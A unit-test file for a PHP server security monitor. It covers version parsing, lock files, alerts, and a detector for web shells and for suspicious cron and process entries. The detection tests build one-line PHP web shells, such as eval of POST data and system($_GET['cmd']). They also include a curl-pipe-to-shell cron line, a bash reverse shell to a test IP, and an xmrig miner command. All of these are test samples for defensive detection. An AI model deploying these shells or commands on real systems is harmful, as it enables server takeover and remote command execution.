"""Unit tests for php-security-watch. Run: python3 -m unittest discover -s tests -v

They need no network and no root. The web shell samples are assembled at run time so the
repository itself never contains a file that a malware scanner would flag.
"""
import contextlib
import importlib.machinery
import importlib.util
import io
import json
import os
import shutil
import tempfile
import time
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
SCRIPT = os.path.join(HERE, '..', 'php-security-watch')


def load():
    loader = importlib.machinery.SourceFileLoader('psw', SCRIPT)
    spec = importlib.util.spec_from_loader('psw', loader)
    mod = importlib.util.module_from_spec(spec)
    loader.exec_module(mod)
    return mod


psw = load()


class Versions(unittest.TestCase):
    def test_order(self):
        self.assertTrue(psw.vlt('8.3.9', '8.3.12'))
        self.assertTrue(psw.vlt('v5.7.8', '5.8.0'))
        self.assertTrue(psw.vlt('2.0.0-beta1', '2.0.0'))
        self.assertTrue(psw.vlt('2.0.0-RC1', '2.0.0'))
        self.assertTrue(psw.vlt('1.2.3', '1.2.3-p1'))
        self.assertFalse(psw.vlt('8.5.4', '8.5.4'))
        self.assertFalse(psw.vlt('dev-main', '1.0.0'))

    def test_composer_constraints(self):
        m = psw.constraint_match
        self.assertTrue(m('2.10.0', '>=2.0.0,<=2.10.1'))
        self.assertFalse(m('2.10.2', '>=2.0.0,<=2.10.1'))
        self.assertTrue(m('1.5.0', '>=2.0.0,<2.10.2|<1.5.1'))
        self.assertTrue(m('v8.1.6', '>=8.0.0,<8.1.0|>=8.1.0,<8.1.7'))
        self.assertFalse(m('v8.1.7', '>=8.0.0,<8.1.0|>=8.1.0,<8.1.7'))
        self.assertTrue(m('7.4.0', '>= 7.0.0, < 7.4.5'))
        self.assertTrue(m('7.4.0', '>=7.0.0 <7.4.5 || >=8'))
        self.assertTrue(m('3.1.0', '==3.1.0'))
        self.assertFalse(m('dev-main', '<9.9.9'))
        self.assertFalse(m('1.0.0', ''))

    def test_cvss(self):
        self.assertEqual(psw.cvss3_score('CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H'), 9.8)
        self.assertEqual(psw.cvss3_score('CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N'), 6.1)
        self.assertEqual(psw.cvss3_score('CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N'), 0.0)
        self.assertIsNone(psw.cvss3_score('garbage'))
        self.assertEqual(psw.severity_from_score(9.8), 'critical')
        self.assertEqual(psw.severity_from_score(6.1), 'medium')


class PackageManagers(unittest.TestCase):
    def test_apt(self):
        text = '\n'.join([
            'Inst libssl3t64 [3.0.13-0ubuntu3.4] (3.0.13-0ubuntu3.5 Ubuntu:24.04/noble-updates, Ubuntu:24.04/noble-security [amd64])',
            'Inst tzdata [2024a-2] (2024b-0ubuntu0.24.04 Ubuntu:24.04/noble-updates [all])',
            'Inst openssl [3.0.11-1~deb12u2] (3.0.15-1~deb12u1 Debian-Security:12/stable-security [amd64])',
            'Conf openssl (3.0.15-1~deb12u1 Debian-Security:12/stable-security [amd64])',
        ])
        sec, other = psw.parse_apt_simulation(text)
        self.assertEqual([s[0] for s in sec], ['libssl3t64', 'openssl'])
        self.assertEqual(other[0][0], 'tzdata')

    def test_dnf(self):
        text = '\n'.join([
            'Last metadata expiration check: 0:10:00 ago.',
            'RHSA-2024:1234 Important/Sec. openssl-libs-1:3.0.7-25.el9_3.x86_64',
            'ALSA-2024:5678 Critical/Sec.  kernel-5.14.0-427.el9.x86_64',
            'RLSA-2024:9999 security Moderate php-cli-8.1.27-1.el9.x86_64 2024-05-01 10:00:00',
        ])
        rows = psw.parse_dnf_updateinfo(text)
        self.assertEqual(rows[0], ('RHSA-2024:1234', 'important', 'openssl-libs-1:3.0.7-25.el9_3.x86_64'))
        self.assertEqual(rows[1][1], 'critical')
        self.assertEqual(rows[2], ('RLSA-2024:9999', 'moderate', 'php-cli-8.1.27-1.el9.x86_64'))

    def test_apk_and_zypper(self):
        self.assertEqual(psw.parse_apk_outdated('Installed:  Available:\nmusl-1.2.4-r2 < 1.2.4-r3\n'),
                         [('musl', '1.2.4-r2', '1.2.4-r3')])
        z = 'repo-update | SUSE-2024-123 | security | important | --- | needed | Security update for openssl\n' \
            'repo-update | SUSE-2024-124 | recommended | low | --- | needed | Bug fix\n'
        self.assertEqual(psw.parse_zypper_patches(z), [('SUSE-2024-123', 'important', 'Security update for openssl')])


class LockFiles(unittest.TestCase):
    def test_composer(self):
        text = json.dumps({'packages': [{'name': 'GuzzleHttp/Guzzle', 'version': '7.4.0'}],
                           'packages-dev': [{'name': 'phpunit/phpunit', 'version': '9.5.0'}]})
        self.assertEqual(psw.parse_composer_lock(text), [('guzzlehttp/guzzle', '7.4.0', False), ('phpunit/phpunit', '9.5.0', True)])

    def test_package_lock_v3_and_v1(self):
        v3 = json.dumps({'lockfileVersion': 3, 'packages': {'': {'name': 'app'}, 'node_modules/lodash': {'version': '4.17.15'},
                         'node_modules/@babel/core': {'version': '7.0.0', 'dev': True}, 'node_modules/local': {'link': True}}})
        self.assertEqual(psw.parse_package_lock(v3), [('@babel/core', '7.0.0', True), ('lodash', '4.17.15', False)])
        v1 = json.dumps({'lockfileVersion': 1, 'dependencies': {'minimist': {'version': '1.2.0', 'dependencies': {
            'deep': {'version': '0.1.0'}}}, 'mine': {'version': 'file:../mine'}}})
        self.assertEqual(psw.parse_package_lock(v1), [('deep', '0.1.0', False), ('minimist', '1.2.0', False)])

    def test_yarn_pnpm(self):
        yarn1 = '"@babel/code-frame@^7.0.0", "@babel/code-frame@^7.10.4":\n  version "7.12.13"\n  resolved "x"\n\n' \
                'lodash@^4.17.15:\n  version "4.17.15"\n'
        self.assertEqual(psw.parse_yarn_lock(yarn1), [('@babel/code-frame', '7.12.13', False), ('lodash', '4.17.15', False)])
        berry = '__metadata:\n  version: 6\n\n"lodash@npm:^4.17.15":\n  version: 4.17.15\n  resolution: "lodash@npm:4.17.15"\n'
        self.assertEqual(psw.parse_yarn_lock(berry), [('lodash', '4.17.15', False)])
        pnpm = "lockfileVersion: '9.0'\n\npackages:\n\n  '@babel/core@7.0.0':\n    resolution: {}\n\n  lodash@4.17.15:\n" \
               "    resolution: {}\n\n  /minimist@1.2.0(react@18.0.0):\n    x: y\n"
        self.assertEqual(psw.parse_pnpm_lock(pnpm), [('@babel/core', '7.0.0', False), ('lodash', '4.17.15', False), ('minimist', '1.2.0', False)])

    def test_ruby_python(self):
        gem = 'GEM\n  specs:\n    rails (7.0.4)\n      actionpack (= 7.0.4)\n    nokogiri (1.13.0-x86_64-linux)\n'
        self.assertEqual(psw.parse_gemfile_lock(gem), [('nokogiri', '1.13.0', False), ('rails', '7.0.4', False)])
        poetry = '[[package]]\nname = "Django"\nversion = "3.2.0"\ndescription = "x"\n'
        self.assertEqual(psw.parse_poetry_lock(poetry), [('django', '3.2.0', False)])
        pipfile = json.dumps({'default': {'requests': {'version': '==2.19.0'}}, 'develop': {'pytest': {'version': '==7.0.0'}}})
        self.assertEqual(psw.parse_pipfile_lock(pipfile), [('pytest', '7.0.0', True), ('requests', '2.19.0', False)])
        req = 'requests==2.19.0\nflask>=2\n# c\nurllib3[socks] == 1.26.4\n'
        self.assertEqual(psw.parse_requirements(req), [('requests', '2.19.0', False), ('urllib3', '1.26.4', False)])

    def test_venv(self):
        d = tempfile.mkdtemp()
        try:
            os.makedirs(os.path.join(d, 'lib', 'python3.12', 'site-packages', 'Jinja2-2.10.dist-info'))
            os.makedirs(os.path.join(d, 'lib', 'python3.12', 'site-packages', 'typing_extensions-4.0.0.dist-info'))
            self.assertEqual(psw.parse_venv(d), [('jinja2', '2.10', False), ('typing-extensions', '4.0.0', False)])
        finally:
            shutil.rmtree(d)


class Signatures(unittest.TestCase):
    def sample(self, body):
        f = tempfile.NamedTemporaryFile('w', suffix='.php', delete=False)
        f.write(body)
        f.close()
        self.addCleanup(os.remove, f.name)
        return psw.scan_php_file(f.name)

    def test_shells_found(self):
        ev = 'ev' + 'al'
        self.assertEqual(self.sample('<?php @%s(base64_decode($x)); ?>' % ev), 'runs decoded data')
        self.assertEqual(self.sample('<?php %s($_POST["c"]);' % ev), 'runs code sent by the visitor')
        self.assertEqual(self.sample('<?php sys' + 'tem($_GET["cmd"]);'), 'runs shell commands sent by the visitor')
        self.assertEqual(self.sample('<?php $_GET["f"]($_GET["a"]);'), 'calls a function named by the visitor')
        self.assertEqual(self.sample('<?php // Files' + 'Man'), 'matches a known web shell')
        self.assertEqual(self.sample('<?php preg_replace("/.*/e", $_POST["x"], "");'), 'uses the preg_replace /e backdoor')
        self.assertEqual(self.sample('<?php $a = 1;\n' * 5000 + 'sys' + 'tem($_GET["c"]);'), 'runs shell commands sent by the visitor')
        blob = 'QUJD' * 1200
        self.assertEqual(self.sample('<?php $p="%s"; %s(gzinflate($p));' % (blob, ev)), 'runs decoded data')
        self.assertEqual(self.sample('<?php $p="%s"; $f=$p; %s($f);' % (blob, ev)), 'hides a large encoded payload next to eval()')

    def test_normal_code_is_clean(self):
        self.assertIsNone(self.sample('<?php echo htmlspecialchars($_GET["q"] ?? ""); $data = base64_decode($row["img"]);'))
        self.assertIsNone(self.sample("<?php\n// Silence is golden.\n"))
        self.assertIsNone(self.sample("<?php $s = preg_replace('/=([a-f0-9]{2})/ie', \"chr(hexdec('\\\\1'))\", $s);"))
        self.assertIsNone(self.sample('<?php $x = "retrieval"; assert_options(ASSERT_ACTIVE, 0); require __DIR__."/a.php";'))
        self.assertIsNone(self.sample('<?php $x = json_decode(file_get_contents("php://input"), true); exec("ls", $out);'))

    def test_cron_and_process_patterns(self):
        self.assertTrue(psw.CRON_OK.search('* * * * * php /var/www/app/artisan schedule:run >> /dev/null 2>&1'))
        self.assertTrue(psw.CRON_BAD.search('*/5 * * * * curl -fsSL http://x.example/a.sh | sh'))
        self.assertTrue(psw.CRON_BAD.search('@reboot /tmp/.x/run'))
        self.assertFalse(psw.CRON_BAD.search('*/5 * * * * php /var/www/site/wp-cron.php'))
        self.assertTrue(psw.ODD_CMD.search('bash -i >& /dev/tcp/203.0.113.9/4444 0>&1'))
        self.assertTrue(psw.MINER.search('/var/tmp/xmrig --donate-level 1'))
        self.assertFalse(psw.ODD_CMD.search('php-fpm: pool www'))


class Network(unittest.TestCase):
    def test_public_bind(self):
        self.assertEqual(psw.public_bind('0.0.0.0'), 'all interfaces')
        self.assertEqual(psw.public_bind('[::]'), 'all interfaces')
        self.assertIsNone(psw.public_bind('127.0.0.1'))
        self.assertIsNone(psw.public_bind('[::1]'))
        self.assertTrue(psw.public_bind('10.0.0.5').startswith('private'))
        self.assertTrue(psw.public_bind('203.0.113.7').startswith('public'))

    def test_webhook_format(self):
        self.assertEqual(psw.webhook_format('https://hooks.slack.com/services/x', 'auto'), 'slack')
        self.assertEqual(psw.webhook_format('https://discord.com/api/webhooks/1/x', 'auto'), 'discord')
        self.assertEqual(psw.webhook_format('https://api.telegram.org/botX/sendMessage?chat_id=1', 'auto'), 'telegram')
        self.assertEqual(psw.webhook_format('https://ntfy.sh/my-topic', 'auto'), 'ntfy')
        self.assertEqual(psw.webhook_format('https://example.com/hook', 'auto'), 'json')
        self.assertEqual(psw.webhook_format('https://ntfy.example.com/alerts', 'auto'), 'ntfy')
        self.assertEqual(psw.webhook_format('https://ntfy.sh/my-topic', 'ntfy'), 'ntfy')

    def test_cycles(self):
        rows = [{'cycle': '24.04'}, {'cycle': '12'}, {'cycle': '9'}]
        self.assertEqual(psw.pick_cycle(rows, '24.04')['cycle'], '24.04')
        self.assertEqual(psw.pick_cycle(rows, '12.7')['cycle'], '12')
        self.assertEqual(psw.pick_cycle(rows, '9.4')['cycle'], '9')
        self.assertIsNone(psw.pick_cycle(rows, '7'))


class Config(unittest.TestCase):
    def test_file_env_and_errors(self):
        d = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, d)
        path = os.path.join(d, 'c.conf')
        with open(path, 'w') as f:
            f.write('# comment\nMODE=fix\nNOTIFY_EMAIL="a@example.com"\nSPELLING_MISTAKE=1\n')
        os.environ['PSW_TIMEOUT'] = '5'
        try:
            c = psw.load_config(path)
        finally:
            del os.environ['PSW_TIMEOUT']
        self.assertEqual(c['MODE'], 'fix')
        self.assertEqual(c['NOTIFY_EMAIL'], 'a@example.com')
        self.assertEqual(c['TIMEOUT'], 5)
        self.assertEqual(c['_unknown'], ['SPELLING_MISTAKE'])
        with open(path, 'w') as f:
            f.write('MODE=yolo\n')
        self.assertRaises(psw.ConfigError, psw.load_config, path)
        with open(path, 'w') as f:
            f.write('KEV_DAYS=lots\n')
        self.assertRaises(psw.ConfigError, psw.load_config, path)


class FakeArgs(object):
    apply = False


class Alerts(unittest.TestCase):
    def ctx(self, **conf):
        c = psw.load_config(None)
        c.update(conf)
        return psw.Ctx(c, FakeArgs())

    def test_new_and_reminders(self):
        ctx = self.ctx(NOTIFY_WHEN='new', DIGEST_WEEKDAY=0)
        ctx.findings = []
        ctx.add('critical', 'php', 'x', 'PHP is old')
        ctx.add('ok', 'os', 'y', 'fine')
        seen = {}
        psw.mark_new(ctx, seen)
        self.assertTrue(ctx.findings[0].new)
        self.assertEqual(psw.should_notify(ctx, seen), (True, 'new'))
        psw.update_seen(ctx, seen, True)
        ctx.findings[0].new = False
        psw.mark_new(ctx, seen)
        self.assertFalse(ctx.findings[0].new)
        self.assertEqual(psw.should_notify(ctx, seen)[0], False)
        seen['keys']['php:x']['notified'] = time.time() - 8 * 86400
        psw.mark_new(ctx, seen)
        self.assertTrue(ctx.findings[0].new)

    def test_warning_to_critical_alerts_again(self):
        ctx = self.ctx(DIGEST_WEEKDAY=0)
        ctx.findings = []
        ctx.add('warning', 'news', 'k', 'x')
        seen = {}
        psw.mark_new(ctx, seen)
        psw.update_seen(ctx, seen, True)
        ctx.findings = []
        ctx.add('critical', 'news', 'k', 'x')
        psw.mark_new(ctx, seen)
        self.assertTrue(ctx.findings[0].new)

    def test_partial_source_failure_is_not_ok(self):
        ctx = self.ctx()
        ctx.count_source('Ubuntu tracker', None)
        self.assertEqual(ctx.sources['Ubuntu tracker'], 'ok')
        ctx.count_source('Ubuntu tracker', 'HTTP Error 429: Too Many Requests')
        self.assertTrue(ctx.sources['Ubuntu tracker'].startswith('partly unavailable (1 of 2 requests failed'))
        ctx.count_source('OSV', 'timed out')
        self.assertEqual(ctx.sources['OSV'], 'unavailable (timed out)')

    def test_ignore(self):
        ctx = self.ctx(IGNORE='CVE-2026-0001')
        ctx.ignore = {'CVE-2026-0001'}
        f = ctx.add('critical', 'libraries', 'p', 'flaw', ids=['CVE-2026-0001'])
        self.assertEqual(f.level, 'info')


class EndToEnd(unittest.TestCase):
    def test_intrusion_run_offline(self):
        d = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, d)
        site = os.path.join(d, 'www', 'site', 'wp-content', 'uploads', '2026')
        os.makedirs(site)
        with open(os.path.join(site, 'cache.php'), 'w') as f:
            f.write('<?php @' + 'ev' + 'al($_POST["x"]);')
        with open(os.path.join(site, 'index.php'), 'w') as f:
            f.write('<?php // Silence is golden.')
        sample = '<?php $refuse("upload", \'<?php ' + 'sys' + 'tem($_GET["c"]);\');'
        for release in ('r1', 'r2', 'r3'):
            tests = os.path.join(d, 'www', 'app', release, 'tests')
            os.makedirs(tests)
            with open(os.path.join(tests, 'upload-unit.php'), 'w') as f:
                f.write(sample)
        env = {'PSW_SCAN_PATHS': os.path.join(d, 'www'), 'PSW_STATE_DIR': os.path.join(d, 'state'),
               'PSW_CHECK_URLS': 'none', 'PSW_DOCKER': 'no'}
        old = dict(os.environ)
        os.environ.update(env)
        out = io.StringIO()
        try:
            with contextlib.redirect_stdout(out):
                rc = psw.main(['--config', os.path.join(d, 'none.conf'), 'run', '--only', 'intrusion', '--no-notify', '--json'])
        finally:
            os.environ.clear()
            os.environ.update(old)
        data = json.loads(out.getvalue())
        titles = [f['title'] for f in data['findings'] if f['level'] == 'critical']
        warnings = [f['title'] for f in data['findings'] if f['level'] == 'warning']
        self.assertEqual(rc, 1)
        self.assertFalse(any('upload-unit.php' in t for t in titles), titles)
        self.assertEqual(len([t for t in warnings if '3 copies of the same file' in t and 'inside a tests folder' in t]), 1, warnings)
        self.assertTrue(any('Possible web shell' in t and 'cache.php' in t for t in titles), titles)
        self.assertTrue(any('inside upload folders' in t for t in titles), titles)
        infos = [f['title'] for f in data['findings'] if f['level'] == 'info' and f['check'] == 'intrusion']
        self.assertTrue(any(t.startswith('Web shell search: read ') and 'PHP file' in t for t in infos), infos)
        self.assertFalse(any('index.php' in t for t in titles), titles)
        self.assertTrue(os.path.exists(os.path.join(d, 'state', 'last.txt')))
        self.assertTrue(os.path.exists(os.path.join(d, 'state', 'seen.json')))


class WalkTest(unittest.TestCase):
    def test_follows_symlinked_sites_once(self):
        import types
        with tempfile.TemporaryDirectory() as d:
            www, disk = os.path.join(d, 'www'), os.path.join(d, 'disk', 'app')
            os.makedirs(www)
            os.makedirs(os.path.join(disk, 'releases', 'r1'))
            open(os.path.join(disk, 'releases', 'r1', 'index.php'), 'w').close()
            os.symlink(disk, os.path.join(www, 'app'))
            os.symlink(os.path.join(disk, 'releases', 'r1'), os.path.join(disk, 'current'))
            os.symlink(www, os.path.join(disk, 'loop'))
            ctx = types.SimpleNamespace(conf={'SCAN_PATHS': www, 'SKIP_PATHS': ''}, walk_cut=None)
            files = [f for _, f in psw.walk_web_files(ctx)]
            self.assertEqual(files, ['index.php'])


if __name__ == '__main__':
    unittest.main()
